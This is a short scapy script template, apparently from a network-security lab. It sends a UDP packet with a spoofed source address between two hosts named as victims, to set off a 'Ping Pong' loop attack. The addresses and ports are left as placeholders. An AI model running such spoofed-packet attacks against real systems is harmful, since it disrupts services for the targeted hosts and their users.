#!/bin/env python3
import socket
from scapy.all import *

# TODO: IP & port configuration
# Tip: suffix
IP_victim1_src = @@@
IP_victim2_dst = @@@
port_src = @@@
port_dst = @@@

ip = IP(src=IP_victim1_src,dst=IP_victim2_dst)
udp = UDP(sport=port_src,dport=port_dst)
data = "Let the Ping Pong game start!\n"
pkt = ip/udp/data

print("Ping Pong Attack: {A}".format(A=data))
send(pkt,verbose=0)
